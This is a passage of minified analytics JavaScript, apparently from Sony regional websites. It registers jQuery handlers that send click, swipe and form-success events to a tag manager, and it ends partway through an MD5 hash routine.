t=jQuery(this).index()+1,a="Module interaction - Slider arrow";1===(t=this.className.match(/pagination\-next/)?2:1)?a+=":Previous":2===t&&(a+=":Next");var o=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername");""===o&&(o=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername"));var i=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-lv2")||e.lv2||"";jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:i,masterName:o,clickedElement:o+" | "+a,clickedElementType:"slider_arrow"})}})))},c.eu_transition_page=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("body").on("click",".moduleTags[data-lv1='informational'][data-lv2='sku-selection'] + section .sku-selector-btn-wrapper a[href='#online-retailers-inner']",(function(){var t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername");""===t&&(t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername"));var a=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-lv2")||e.lv2||"";jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:a,masterName:t,clickedElement:t+" | Module interaction - Transition buy online",clickedElementType:"eu_transition-buy_online_click",additionalVariables:"products"})})),jQuery("body").on("click",".moduleTags[data-lv1='informational'][data-lv2='sku-selection'] + section .sku-selector-btn-wrapper a[href='#dealer-locator-container']",(function(){var t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername");""===t&&(t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername")),jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:t,clickedElement:t+" | Module interaction - Find dealer",clickedElementType:"eu_transition-find_dealer_click",additionalVariables:"products"})})),jQuery("body").on("click",".moduleTags[data-lv1='informational'][data-lv2='dealer-locator'] + section.dealer-locator a#findLocations",(function(){var t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername");""===t&&(t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername")),jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:t,clickedElement:t+" | Module interaction - Search dealer",clickedElementType:"eu_transition-search_dealer_click",additionalVariables:"products"})})),jQuery(document).on("LocationSelectSuccessEvent",(function(t){var a=jQuery('section[id^="dealer_locator"]').prev(".moduleTags[data-lv1='informational'][data-lv2='dealer-locator']").data("mastername")||"";jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:a,clickedElement:a+" | Module interaction - Search dealer",clickedElementType:"eu_transition-search_dealer_click",additionalVariables:"products"})})),jQuery("body section.dealer-locator").on("click","div.shopDetailsColumn a[href]:not(empty)",(function(t){var a=jQuery('section[class^="dealer-locator"]').prev(".moduleTags[data-lv1='informational'][data-lv2='dealer-locator']").attr("data-mastername")||"",o=/^getDirection/gi.test(jQuery(t.currentTarget).attr("onclick"))?"directions":/^http/gi.test(jQuery(t.currentTarget).attr("href"))?"website":/^mailto/gi.test(t.currentTarget.href)?"email":"untracked element:"+t.currentTarget.className;jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:a,clickedElement:a+" | Module interaction - Dealer: "+o+" click",clickedElementType:"eu_transition-dealer:"+o+"_click",additionalVariables:"products"})})),jQuery("body section.dealer-locator-v2").on("click","a.dl-button-directions,a.dl-dealer__directions,a.dl-dealer__website,a.dl-dealer__cta",(function(t){var a=jQuery('section[id^="dealer_locator"]').prev(".moduleTags[data-lv1='informational'][data-lv2='dealer-locator']").attr("data-mastername")||"",o=/(dl-button-directions|dl-dealer__directions)/gi.test(t.currentTarget.className)?"directions":/dl-dealer__website/gi.test(t.currentTarget.className)?"website":/dl-dealer__cta/gi.test(t.currentTarget.className)&&/^tel/gi.test(t.currentTarget.href)?"telephone":/dl-dealer__cta/gi.test(t.currentTarget.className)&&/^mailto/gi.test(t.currentTarget.href)?"email":"untracked element:"+t.currentTarget.className;jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:a,clickedElement:a+" | Module interaction - Dealer: "+o+" click",clickedElementType:"eu_transition-dealer:"+o+"_click",additionalVariables:"products"})})),/.*\.sony\.com\.vn$/.test(window.location.host)&&jQuery("body").on("click",".moduleTags[data-lv1='informational'][data-lv2='sku-selection'] + section .sku-selector-btn-wrapper a[href*='hub.sony-asia.com']",(function(){var t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername");""===t&&(t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername"));var a=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-lv2")||e.lv2||"";jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:a,masterName:t,clickedElement:t+" | Module interaction - Transition buy online",clickedElementType:"vn_transition-buy_online_click",additionalVariables:"products"})})),document.URL.toLocaleLowerCase().indexOf("/buy")>-1&&jQuery("body").on("click","div.sku-selector-wrapper > div.tab-content > div > div > div > div > div > div.sku-details.span5.m-span6 > div.row > div > div.sku-selector-btn-wrapper > div.buy-button.btn-buy-online > div > a[href*='shopgentec.ca']",(function(){jQuery("body").trigger({type:"retailerSelected",index:1,name:"gentec",stockStatus:"in-stock"})})),document.URL.toLowerCase().indexOf("/buy")>-1&&jQuery("body").on("click",".moduleTags[data-lv1='informational'][data-lv2='sku-selection'] + section .sku-selector-btn-wrapper a[href*='store.sony.ru/common/gwt_redirect']",(function(){jQuery("body").trigger("retailerSelected",{index:"1",name:"RU store",stockStatus:"in-stock"})})))},c.bullet_navigation_clicks=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on(r,".moduleTags + section .sony-dot-nav .pagination-bullets .pagination-bullet, .moduleTags + section .navigation-container .pagination-bullets .pagination-bullet, .moduleTags[data-mastername*='Custom-Ent-PSN-en_GL'] + section .sen-modular-e13-a1 #pager2 a, .moduleTags + section .editorial-carousel .pagination-bullets>li",(function(){if(n()){var t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername");""===t&&(t=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-mastername"));var a=jQuery(this).index(),o="";o=void 0!==a?t+" | Module interaction - Bullet Click:"+(a+=1):t+" | Module interaction - Bullet Click";var i=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-lv2")||e.lv2||"";jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:i,masterName:t,clickedElement:o,clickedElementType:"Pagination Bullet"})}}))},c.swipe_gestures=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("dragend.sonycarousel","section.gwt-module:not(.editorial_360_viewer,#local_banner_default.sony-carousel-container),section.sku-selector",(function(t){var a=jQuery(this).closest("section.gwt-module,section.sku-selector").prev(".visuallyhidden.moduleTags").attr("data-mastername")||"",o=t.gesture.direction||"";if(!1!==/^(right|left)$/gi.test(o)&&!0!==/dual/gi.test(a)){var i=a+" | Module Interaction - Slider arrow"+("left"===o?":Next":":Previous"),r=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").attr("data-lv2")||e.lv2||"";jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:r,masterName:a,clickedElement:i,clickedElementType:"slider_arrow"})}}))},c.variations_list_open=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("click",".moduleTags[data-lv1='informational'][data-lv2='product_summary'] + section .mlp-container.with-collapser .mlp-collapser.open",(function(){var e="pdp-product_summary";jQuery("body").trigger({type:"moduleInteraction",lv1:"informational",lv2:"product_summary",masterName:e,clickedElement:"pdp-product_summary | Module interaction - Product variations opened",clickedElementType:"Product variations opened"})}))},c.ru_3d_viewer=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("click",".moduleTags[data-masterName*='3DFeature'][data-lv1='editorial'][data-lv2='image'] + section div.m1up-container div.link a, .moduleTags[data-masterName*='3DReview'][data-lv1='editorial'][data-lv2='image'] + section div.m1up-container div.link a",(function(){var e="undefined"!=typeof sony&&void 0!==sony.digitalData&&sony.digitalData.product||{},t="pdp-RU_3d_viewer",a="pdp-RU_3d_viewer | Module interaction - Link click: "+_bsq.aa.getMostGranularProductID(e);jQuery("body").trigger({type:"moduleInteraction",lv1:"editorial",lv2:"image",masterName:t,clickedElement:a,clickedElementType:"3D viewer link click"})}))},c.gallery_product_differentiator=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on(r,".mlp-block ul.prime-differentiator-list li",(function(e){var t=jQuery(this).data("variation-name")||"",a=(jQuery(this).data("super-model-name"),jQuery(this).data("variation-type")||""),o="gallery",i="gallery | Product differentiator: "+a+" - "+t,r="Product differentiator: "+a;jQuery("body").trigger({type:"moduleInteraction",lv1:"gallery",lv2:"tabs",masterName:o,clickedElement:i,clickedElementType:r})}))},c.editorial_360_viewer=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("mouseup touchend",".moduleTags[data-lv1='editorial'][data-lv2='360_viewer'] + section.editorial_360_viewer",(function(e){if(1==e.which||2==e.which||"touchend"==e.type){var t=jQuery(this).closest("section.editorial").prev(".visuallyhidden.moduleTags").data("mastername"),a=t+" | Module interaction: Dragable 360 Viewer";jQuery("body").trigger({type:"moduleInteraction",lv1:"editorial",lv2:"360_viewer",masterName:t,clickedElement:a,clickedElementType:"Dragable 360 Viewer"})}}))},c.ru_dealer_locator_gmaps=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("dealer_google_click",(function(t){var a=jQuery(this).find("div.external-html").prev(".visuallyhidden.moduleTags").data("mastername");""===a&&(a=jQuery(this).find("div.external-html").prev(".visuallyhidden.moduleTags").attr("data-mastername")),sgwn.eVar42=((t.dealerName||"")+"|"+(t.dealerId||"")+"["+t.dealerCity+"]").toLowerCase(),jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:a,clickedElement:a+" | Google maps click",clickedElementType:"ru_dealer_locator",additionalVariables:"eVar42"})}))},c.ru_dealer_locator_phone=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("dealer_phone_click",(function(t){var a=jQuery(this).find("div.external-html").prev(".visuallyhidden.moduleTags").data("mastername");""===a&&(a=jQuery(this).find("div.external-html").prev(".visuallyhidden.moduleTags").attr("data-mastername")),sgwn.eVar42=((t.dealerName||"")+"|"+(t.dealerId||"")+"["+t.dealerCity+"]").toLowerCase(),jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:a,clickedElement:a+" | Module interaction - RU dealer locator: Phone number click",clickedElementType:"ru_dealer_locator",additionalVariables:"eVar42"})}))},c.ru_dealer_locator_search=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("dealer_search",(function(t){var a="Module interaction - RU dealer locator: Search "+(t.mode||""),o=jQuery(this).find("div.external-html").prev(".visuallyhidden.moduleTags").data("mastername");""===o&&(o=jQuery(this).find("div.external-html").prev(".visuallyhidden.moduleTags").attr("data-mastername")),s.prop54=void 0!==t.search_results?t.search_results:0,s.prop54=s.prop54.toString(),s.prop55=void 0!==t.search_results_ids?t.search_results_ids.join(","):"",s.prop56=("manual"===t.mode?t.search_term:t.search_city)||"",jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:o,clickedElement:o+" | "+a,clickedElementType:"ru_dealer_locator",additionalVariables:"prop54,prop55,prop56"})}))},c.spt_footer_icon_banner_clicks=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("click",".moduleTags[data-lv1='navigation'][data-lv2='icon_banner'] + section[id='icon_banner-container'] a",(function(e){var t=jQuery(this).data("footer_banner_link");if(null!=t){t=t.replace("Eamil us","Email us");var a=jQuery(this).closest("section[id='icon_banner-container']").prev(".visuallyhidden.moduleTags").data("mastername"),o=a+" | Module interaction - Link click:"+t;jQuery("body").trigger({type:"moduleInteraction",lv1:"navigation",lv2:"icon_banner",masterName:a,clickedElement:o,clickedElementType:"SWT Footer Icon Banner"})}}))},c.ces_oof_module_sticky_nav_links=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery(".moduleTags[data-mastername='Page-Nav-OOFM-CES2018-en_GL-2017-11-M03-seeproducts'], .moduleTags[data-mastername='Page-Nav-OOFM-CES2019_OOFM-en_GL-2018-11-M03-seeproducts'], .moduleTags[data-mastername='Page-Nav-OOFM-CES2020-en_GL-2019-11-M02-ourproducts']").length>0&&jQuery("body").on("click","a.editorial-anchor-link-btn",(function(t){var a="",o="",i=jQuery('div.moduleTags[data-mastername^="Page-Nav-OOFM-CES"]').attr("data-mastername");void 0!==this&&void 0!==this.href&&(a=""!==jQuery(this).attr("href")?jQuery(this).attr("href").replace("#",""):this.innerText||this.textContent),o=void 0!==a&&a.trim().length>0?"Module interaction - Module sticky nav link:"+a:"Module interaction - Module sticky nav link",jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:i,clickedElement:i+" | "+o,clickedElementType:"ces"+i.replace("Page-Nav-OOFM-CES","").substr(0,4)+"_oof_module_sticky_nav_links"})}))},c.ces_primary_tout_clicks=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery("body").on&&jQuery("body").on("click",".moduleTags[data-lv1='primary'][data-lv2='tout'][data-mastername='Pri-Tout-OOFM-CES2018-en_GL-2017-11-M01-spotlightsony'] ~ section a.pct-n-0-anchor",(function(){var e=jQuery(this).closest("section").prev(".visuallyhidden.moduleTags").data("mastername");jQuery("body").trigger({type:"moduleInteraction",lv1:"primary",lv2:"tout",masterName:e,clickedElement:e+" | Module interaction - Primary tout press conference link",clickedElementType:"ces2018_Primary-tout_click"})}))},c.ces_newsletter_subscription=function(e){"undefined"!=typeof jQuery&&document.querySelectorAll("#primary_tout_for_pdx_prospect").length>0&&jQuery(document).ajaxComplete((function(e,t,a){void 0!==a&&void 0!==a.url&&void 0!==a.type&&(a.url.match(/.*\/mysony\/api\/v1\/prospect\/post.*/i)&&"POST"===a.type&&"OK"===(JSON.parse(t.responseText)||{}).status&&(jQuery("i.fonticon-10-sm-bold-check").each((function(e,t){jQuery(t).is(":visible")&&(utag_data.aaEmailSubscritpion="pdx-prospect-form")})),utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar24,eVar70",utag_data.aaLinkTrackEvents="event61",utag_data.aaEvents.push("event61"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaLinkType="o",utag_data.aaLinkName="PDX prospect newsletter subscription | "+utag_data.aaEmailSubscritpion,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())))}))},c.pic_qual_oof_module_sticky_nav_links=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery(".moduleTags[data-mastername='Page-Nav-OOFM-Picture-Quality-en_GL-2017-11-M02-signalprocessing']").length>0&&jQuery("body").on("click","a.editorial-anchor-link-btn",(function(){var t="",a="";void 0!==this&&void 0!==this.href&&(t=""!==jQuery(this).attr("href")?jQuery(this).attr("href").replace("#",""):this.innerText||this.textContent),a=void 0!==t&&t.trim().length>0?"Module interaction - Module sticky nav link:"+t:"Module interaction - Module sticky nav link";var o="Page-Nav-OOFM-Picture-Quality-en_GL-2017-11-M02-signalprocessing";jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:o,clickedElement:o+" | "+a,clickedElementType:"picture_quality_oof_module_sticky_nav_links"})}))},c.ru_oof_extrabass=function(e){if("undefined"!=typeof jQuery&&void 0!==jQuery().on&&/sony\.ru\/electronics\/extrabass/gi.test(document.location)){var t=jQuery("#regform,form").closest("div.external-html").prev(".visuallyhidden.moduleTags").attr("data-mastername"),a=XMLHttpRequest;XMLHttpRequest=function(){try{return this.xhr=new a,this}catch(e){return null}},XMLHttpRequest.prototype.open=function(e,t,a,o,i){try{return this.xhr.open(e,t,a,o,i)}catch(e){return null}},XMLHttpRequest.prototype.setRequestHeader=function(e,t){try{this.xhr.setRequestHeader(e,t)}catch(e){}},XMLHttpRequest.prototype.send=function(e){var t=null;try{t=this,this.xhr.onreadystatechange=function(){t.onreadystatechangefunction()},this.xhr.send(e)}catch(e){}},XMLHttpRequest.prototype.onreadystatechangefunction=function(){try{if(4==this.xhr.readyState&&/dealerlocator\.sony\.ru\/api\/promo\/extrabass$/gi.test(this.xhr.responseURL)&&200===this.xhr.status){var e="RU ExtraBass OOF Registration";jQuery("body").trigger({type:"moduleInteraction",lv1:"content",lv2:"external_html",masterName:t,clickedElement:t+" | Module interaction - "+e,clickedElementType:e,additionalVariables:""})}this.readyState=this.xhr.readyState,this.responseText=this.xhr.responseText,this.responseXML=this.xhr.responseXML,this.status=this.xhr.status,this.statusText=this.xhr.statusText}catch(e){}this.onreadystatechange()}}},c.spt_important_information_label=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery(".moduleTags[data-mastername='important_information_label']").length>0&&jQuery("body").on("click","a.important_information_label__text",(function(t){var a=jQuery(t.currentTarget).text()||"",o="",i="important_information_label";void 0!==a&&a.trim().length>0&&(o="Module interaction - Support: "+a+" label click"),jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:i,clickedElement:i+" | "+o,clickedElementType:"spt_important_information"})}))},c.ifa_oof_module_sticky_nav_links=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery(".moduleTags[data-mastername='Page-Nav-OOFM-IFA2018-en_GL-2018-07-M03-seeour'],.moduleTags[data-mastername='Page-Nav-OOFM-IFA2019-en_GL-2019-07-M03-seeour']").length>0&&jQuery("body").on("click","a.editorial-anchor-link-btn",(function(){var t="",a="",o="";try{o=(new SonyAnalytics).build().analytics.page.name||""}catch(e){}void 0!==this&&void 0!==this.href&&(t=""!==jQuery(this).attr("href")?jQuery(this).attr("href").replace("#",""):this.innerText||this.textContent),a=void 0!==t&&t.trim().length>0?"Module interaction - Module sticky nav link:"+t:"Module interaction - Module sticky nav link";var i=/2019/gi.test(o)?"Page-Nav-OOFM-IFA2019-en_GL-2019-07-M03-seeour":"Page-Nav-OOFM-IFA2018-en_GL-2018-07-M03-seeour";jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:i,clickedElement:i+" | "+a,clickedElementType:/2019/gi.test(o)?"ifa2019_oof_module_sticky_nav_links":"ifa2018_oof_module_sticky_nav_links"})}))},c.ru_oof_presale=function(e){if("undefined"!=typeof jQuery&&void 0!==jQuery().on&&/sony\.ru\/presale\//gi.test(document.location)){var t=jQuery("div.external-html")[0];if("function"==typeof MutationObserver)new MutationObserver((function(e){var t=!1;for(var o in e)if("attributes"==e[o].type&&"order__status order__status_success"===e[o].target.className&&!1===t){t=!0;break}!0===t&&a()})).observe(t,{attributes:!0,childList:!0,subtree:!0});var a=function(){var e=jQuery("form.order__form").closest("div.external-html").prev(".visuallyhidden.moduleTags").data("mastername");""===e&&(e=jQuery("form.order__form").closest("div.external-html").prev(".visuallyhidden.moduleTags").attr("data-mastername"));var t=e.replace(/External-HTML-RU-Presale-?/gi,"")||"",a="Module interaction - RU Presale "+t+" OOF Registration";jQuery("body").trigger({type:"moduleInteraction",lv1:"content",lv2:"external_html",masterName:e,clickedElement:e+" | "+a,clickedElementType:"ru_oof_presale_"+t.toLowerCase(),additionalVariables:""})}}},c.flexiModule=function(e){var t=[];if("undefined"!=typeof jQuery&&void 0!==jQuery().on){var a=document.querySelectorAll('div.visuallyhidden.moduleTags[data-name^="Html-Ext-OOFM-"][data-name$="toomuch"]')[0];jQuery(a).insertBefore("section#flexi-template-module"),jQuery(document).on("flexiModuleShow flexiModuleCTA",(function(e){var a=e.originalEvent||e,o=jQuery("section#flexi-template-module").prev(".visuallyhidden.moduleTags").data("mastername"),i=a.detail.position||0,r=a.detail.name||"",n=a.type||"",s="Module interaction - Fleximodule "+(n=n.replace("flexiModule",""))+" | q"+i+":"+r;/show/gi.test(n)&&t.indexOf("q"+i)>-1||(jQuery("body").trigger({type:"moduleInteraction",lv1:"informational",lv2:"html_template",masterName:o,clickedElement:o+" | "+s,clickedElementType:"Fleximodule "+n+" | q"+i}),/show/gi.test(n)&&t.push("q"+i))}))}},c.editorial_slideshow=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("click",".moduleTags[data-lv1='editorial'][data-lv2='slideshow'] + section a.primary-link.btn",(function(t){if(n()){var a=jQuery(t.currentTarget).closest("section.editorial_slideshow").prev(".visuallyhidden.moduleTags").attr("data-mastername"),o=jQuery(t.currentTarget).attr("href").replace("#","")||"";jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:a,clickedElement:a+" | Module Interaction - CTA discover more"+(""!==o?":"+o:""),clickedElementType:"editorial_slideshow_discover_more"})}}))},c.tertiary_tout_container=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("click",".moduleTags[data-lv1='tertiary'][data-lv2='tout_container'] + section a.primary-link",(function(t){if(n()){var a=jQuery(t.currentTarget).closest("section[id^='tertiary_tout_container']").prev(".visuallyhidden.moduleTags").attr("data-mastername")||"",o=jQuery(t.currentTarget).closest("section[id^='tertiary_tout_container']").prev(".visuallyhidden.moduleTags").attr("data-lv2")||"",i=jQuery(t.currentTarget).attr("href").replace("#","")||"";jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:o||e.lv2||"",masterName:a,clickedElement:a+" | Module Interaction - CTA discover more"+(""!==i?":"+i:""),clickedElementType:"tertiary_tout_container_discover_more"})}}))},c.google_translate_links=function(e){"undefined"!=typeof jQuery&&void 0!==jQuery("body").on&&jQuery("body").on("click",".reviews-listings .translate-review-link, .reviews-listings .original-review-link",(function(e){var t=jQuery(e.currentTarget).closest("section[id^='reviews_listing']").parent(".container").prev(".visuallyhidden.moduleTags").attr("data-mastername")||"",a=""!=e.currentTarget.className?e.currentTarget.className:e.currentTarget.innerText;jQuery("body").trigger({type:"moduleInteraction",lv1:"primary",lv2:"tout",masterName:t,clickedElement:t+" | Module interaction - "+a,clickedElementType:"translate_review_click"})}))},c.choose_your_section=function(e){"pdp"===utag_data.aaPageTemplate&&/xperia 1 ii|xperia 10 ii/gi.test(utag_data.aaPageName)&&"undefined"!=typeof jQuery&&void 0!==jQuery("body").on&&jQuery("body").on("click",".moduleTags[data-lv1='secondary'][data-lv2='only_sony_carousel'] + section[id^='urn:sony:module:one_sony_tout_carousel'] a.primary-link",(function(t){var a=jQuery(t.currentTarget).closest("section[id^='urn:sony:module:one_sony_tout_carousel']").prev(".visuallyhidden.moduleTags").attr("data-mastername")||"",o=jQuery(t.currentTarget).closest("section[id^='urn:sony:module:one_sony_tout_carousel']").prev(".visuallyhidden.moduleTags").attr("data-lv2")||"",i=jQuery(t.currentTarget).attr("href").replace("#","")||"";jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:o||e.lv2||"",masterName:a,clickedElement:a+" | Module Interaction  Link click: "+i,clickedElementType:"one_sony_tout_carousel_choose_your_section"})}))},c.editorial_anchor_links=function(e){"oof"===utag_data.aaPageTemplate&&"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("body").on("click",".moduleTags[data-mastername^='Page-Nav'] ~ div.editorial-anchor-links-wrapper #editorial-anchor-links--sticky-nav .editorial-anchor-link-btn, .moduleTags[data-mastername^='Page-Nav'] ~ div.editorial-anchor-links-wrapper #editorial-anchor-links--static-nav .editorial-anchor-link-btn",(function(t){var a="",o="",i=jQuery(this).closest("div.editorial-anchor-links-wrapper").prev(".visuallyhidden.moduleTags").data("mastername")||jQuery(this).closest("div.editorial-anchor-links-wrapper").prev("div").prev(".visuallyhidden.moduleTags").data("mastername");""===i&&(i=jQuery(this).closest("div.editorial-anchor-links-wrapper").prev(".visuallyhidden.moduleTags").attr("data-mastername")||jQuery(this).closest("div.editorial-anchor-links-wrapper").prev("div").prev(".visuallyhidden.moduleTags").attr("data-mastername")),void 0!==this&&void 0!==this.href&&(a=""!==jQuery(this).attr("href")?jQuery(this).attr("href").replace("#",""):this.innerText||this.textContent),o=void 0!==a&&a.trim().length>0?"Module Interaction - Editorial anchor link:"+a:"Module Interaction - Editorial anchor link",jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:i,clickedElement:i+" | "+o,clickedElementType:"editorial-anchor-link"})})),jQuery("body").on("click",".moduleTags[data-lv1='editorial'][data-lv2='chapters'] + section a.primary-link.btn",(function(t){var a="",o="",i=jQuery(this).closest(".editorial_chapters").prev(".visuallyhidden.moduleTags").attr("data-mastername");void 0!==this&&void 0!==this.href&&""!==jQuery(this).attr("href")&&(a=jQuery(this).attr("title")),o=void 0!==a&&a.trim().length>0?"Module Interaction - Editorial anchor link:"+a:"Module Interaction - Editorial anchor link",jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:i,clickedElement:i+" | "+o,clickedElementType:"editorial-anchor-link"})})))},c.anchor_links=function(e){"oof"===utag_data.aaPageTemplate&&"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("click",".moduleTags[data-mastername^='E-Vid-OOFM'] + section[id^='editorial_video'] .primary-link.btn",(function(t){var a="",o="",i=jQuery(this).closest("section[id^='editorial_video']").prev(".visuallyhidden.moduleTags").data("mastername");""===i&&(i=jQuery(this).closest("section[id^='editorial_video']").prev(".visuallyhidden.moduleTags").attr("data-mastername")),void 0!==this&&void 0!==this.href&&(a=""!==jQuery(this).attr("href")?jQuery(this).attr("href").replace("#",""):this.innerText||this.textContent),o=void 0!==a&&a.trim().length>0?"Module Interaction - Anchor link:"+a:"Module Interaction - Anchor link",jQuery("body").trigger({type:"moduleInteraction",lv1:e.lv1||"",lv2:e.lv2||"",masterName:i,clickedElement:i+" | "+o,clickedElementType:"anchor-link"})}))},"undefined"!=typeof jQuery&&function(e,t){if(null!=e)for(var a=0;a<e.length;a++)if(void 0!==e[a].isActive&&void 0!==e[a].trackerFunction&&(e[a].isActive,1)){var o=t[e[a].trackerFunction],i={lv1:e[a].lv1,lv2:e[a].lv2};"function"==typeof o&&o(i)}}(d,c)}}catch(e){utag.DB(e)}}catch(e){utag.DB(e)}try{try{(function(){!function(e){if(void 0===t)var t={};if(void 0===a)var a={};if(void 0===o)var o={};if(o.radio||(o.radio={}),o.plugin||(o.plugin={}),void 0===i)var i={};i.clock||(i.clock={}),function(e){"use strict";function t(e,t){var a=(65535&e)+(65535&t);return(e>>16)+(t>>16)+(a>>16)<<16|65535&a}function a(e,a,o,i,r,n){return t(function(e,t){return e<<t|e>>>32-t}(t(t(a,e),t(i,n)),r),o)}function o(e,t,o,i,r,n,s){return a(t&o|~t&i,e,t,r,n,s)}function i(e,t,o,i,r,n,s){return a(t&i|o&~i,e,t,r,n,s)}function r(e,t,o,i,r,n,s){return a(t^o^i,e,t,r,n,s)}function n(e,t,o,i,r,n,s){return a(o^(t|~i),e,t,r,n,s)}function s(e,a){e[a>>5]|=128<<a%32,e[14+(a+64>>>9<<4)]=a;var s,d,c,l,u,g=1732584193,p=-271733879,m=-1732584194,_=271733878;for(s=0;s<e.length;s+=16)d=g,c=p,l=m,u=_,g=o(g,p,m,_,e[s],7,-680876936),_=o(_,g,p,m,e[s+1],12,-389564586),m=o(m,_,g,p,e[s+2],17,606105819),p=o(p,m,_,g,e[s+3],22,-1044525330),g=o(g,p,m,_,e[s+4],7,-176418897),_=o(_,g,p,m,e[s+5],12,1200080426),m=o(m,_,g,p,e[s+6],17,-1473231341),p=o(p,m,_,g,e[s+7],22,-45705983),g=o(g,p,m,_,e[s+8],7,1770035416),_=o(_,g,p,m,e[s+9],12,-1958414417),m=o(m,_,g,p,e[s+10],17,-42063),p=o(p,m,_,g,e[s+11],22,-1990404162),g=o(g,p,m,_,e[s+12],7,1804603682),_=o(_,g,p,m,e[s+13],12,-40341101),m=o(m,_,g,p,e[s+14],17,-1502002290),g=i(g,p=o(p,m,_,g,e[s+15],22,1236535329),m,_,e[s+1],5,-165796510),_=i(_,g,p,m,e[s+6],9,-1069501632),m=i(m,_,g,p,e[s+11],14,643717713),p=i(p,m,_,g,e[s],20,-373897302),g=i(g,p,m,_,e[s+5],5,-701558691),_=i(_,g,p,m,e[s+10],9,38016083),m=i(m,_,g,p,e[s+15],14,-660478335),p=i(p,m,_,g,e[s+4],20,-405537848),g=i(g,p,m,_,e[s+9],5,568446438),_=i(_,g,p,m,e[s+14],9,-1019803690),m=i(m,_,g,p,e[s+3],14,-187363961),p=i(p,m,_,g,e[s+8],20,1163531501),g=i(g,p,m,_,e[s+13],5,-1444681467),_=i(_,g,p,m,e[s+2],9,-51403784),m=i(m,_,g,p,e[s+7],14,1735328473),g=r(g,p=i(p,m,_,g,e[s+12],20,-1926607734),m,_,e[s+5],4,-378558),_=r(_,g,p,m,e[s+8],11,-2022574463),m=r(m,_,g,p,e[s+11],16,1839030562),p=r(p,m,_,g,e[s+14],23,-35309556),g=r(g,p,m,_,e[s+1],4,-1530992060),_=r(_,g,p,m,e[s+4],11,1272893353),m=r(m,_,g,p,e[s+7],16,-155497632),p=r